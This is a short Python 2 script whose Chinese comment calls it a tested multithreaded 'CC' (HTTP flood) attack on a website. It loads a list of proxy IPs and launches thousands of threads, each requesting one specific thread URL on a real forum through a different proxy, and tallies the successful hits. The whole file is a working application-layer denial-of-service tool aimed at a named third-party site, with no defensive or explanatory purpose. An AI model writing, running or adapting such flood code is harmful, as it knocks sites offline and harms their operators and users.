#coding=utf-8 测试通过：多线程cc访问站点
import sys
sys.path.append('E:\\python_En_code\\python27\\lib\\')
import deflibs
from time import sleep
import threading,os


alltimes=[0]
ok_times=[0]
ips = deflibs.OpenReadTxt("../temp/ip_valid.txt")
threads=[]
def OpenCCTarget(ip, alltims,oktimes):
    proxies = {"http": "http://" + ip + ""}
    try:
        r = deflibs.RequestsGetByProxy('http://www.51wincai.com/bbs/forum.php?mod=viewthread&tid=196638&modthreadkey=203245c18f6b264bb45e6d4c95b796bb', proxies)
        print str(oktimes[0]) + " OK !" #+ ". " + str(r)
        alltims[0] = alltims[0] + 1
        oktimes[0] = oktimes[0] + 1
    except:
        alltims[0] = alltims[0] + 1
        print "-------------failed !"
        sleep(0.7)
        return
for id, i in enumerate(range(1,100)):
    for id2, ip in enumerate(ips):
        t1 = threading.Thread(target=OpenCCTarget, args=(ip, alltimes,ok_times))
        threads.append(t1)
if threads.count > 0:
    for aa in threads:
        aa.setDaemon(True)
        aa.start()
    aa.join()
print 'conclusion :  %s/%s ' % (ok_times[0], alltimes[0])